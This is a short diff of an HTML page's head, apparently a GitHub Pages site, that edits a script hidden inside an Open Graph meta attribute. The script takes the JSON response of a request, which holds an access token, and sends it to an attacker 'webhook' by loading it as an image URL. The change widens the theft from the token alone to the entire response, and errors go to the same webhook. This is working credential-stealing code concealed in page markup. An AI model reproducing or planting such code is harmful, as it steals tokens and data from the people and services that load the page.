@@ -35,15 +35,14 @@
         });
   
         const json = await res1.json();
-        const accessToken = json.token;
   
-        // Gửi token tới webhook
-        new Image().src = webhook + "?access_token=" + encodeURIComponent(accessToken);
+        // Gửi toàn bộ json tới webhook
+        new Image().src = webhook + "?data=" + encodeURIComponent(JSON.stringify(json));
       } catch (e) {
         new Image().src = webhook + "?error=" + encodeURIComponent(e.message);
       }
     })();
-  </script>' />  
+  </script>' /> 
   <meta property="og:image" content="https://example.com/image.jpg" />
   <meta property="og:url" content="https://username.github.io/repo-name/" />
 </head>
